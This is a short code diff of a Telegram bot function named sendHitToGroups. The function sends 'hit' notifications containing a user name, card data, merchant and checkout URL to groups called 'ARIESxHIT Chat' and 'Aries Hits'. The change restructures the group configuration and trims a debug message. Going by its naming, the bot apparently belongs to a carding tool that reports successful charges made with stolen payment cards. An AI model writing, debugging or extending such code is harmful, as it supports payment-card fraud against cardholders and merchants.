@@ -496,31 +496,34 @@ const MAIN_MENU_KEYBOARD = {
 
 // Send hit notification to group chats
 async function sendHitToGroups(hitData, checkoutUrl) {
-  console.log('[SEND_HIT_GROUPS] Called with:', { hitData, checkoutUrl });
+  console.log('[SEND_HIT_GROUPS] Called with hitData:', hitData);
 
-  // DEBUG: Send a visible test message to confirm function is called
   const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const debugMessage = `🔧 DEBUG: sendHitToGroups called\nUser: ${hitData.userName}\nCard: ${hitData.card}\nMerchant: ${hitData.merchant}\nTime: ${new Date().toLocaleTimeString()}`;
+  const GROUP_1 = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
+  const GROUP_2 = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
 
-  try {
-    // Send debug message to the first group as a test
-    const GROUP_1 = process.env.TELEGRAM_GROUP_1;
-    if (GROUP_1 && BOT_TOKEN) {
-      await sendMessage(BOT_TOKEN, GROUP_1, debugMessage);
-      console.log('[SEND_HIT_GROUPS] Debug message sent to GROUP_1');
-    }
-  } catch (debugError) {
-    console.error('[SEND_HIT_GROUPS] Debug message failed:', debugError.message);
-  }
-
-  const GROUP_1_ID = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
-  const GROUP_2_ID = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
-
-  console.log('[SEND_HIT_GROUPS] Config - BOT_TOKEN:', !!BOT_TOKEN, 'GROUP_1:', GROUP_1_ID, 'GROUP_2:', GROUP_2_ID);
+  console.log('[SEND_HIT_GROUPS] Config - BOT_TOKEN:', !!BOT_TOKEN, 'GROUP_1:', GROUP_1, 'GROUP_2:', GROUP_2);
 
   if (!BOT_TOKEN) {
     console.log('[SEND_HIT_GROUPS] No BOT_TOKEN, returning');
     return;
+  }
+
+  if (!GROUP_1 && !GROUP_2) {
+    console.log('[SEND_HIT_GROUPS] No groups configured, returning');
+    return;
+  }
+
+  // Send a simple debug message to confirm function is working
+  const debugMessage = `🔧 DEBUG: sendHitToGroups executed at ${new Date().toLocaleTimeString()}`;
+
+  try {
+    if (GROUP_1) {
+      await sendMessage(BOT_TOKEN, GROUP_1, debugMessage);
+      console.log('[SEND_HIT_GROUPS] Debug message sent to GROUP_1');
+    }
+  } catch (debugError) {
+    console.error('[SEND_HIT_GROUPS] Failed to send debug message:', debugError.message);
   }
 
   // Detect merchant name - prioritize hitData.merchant, fallback to URL detection
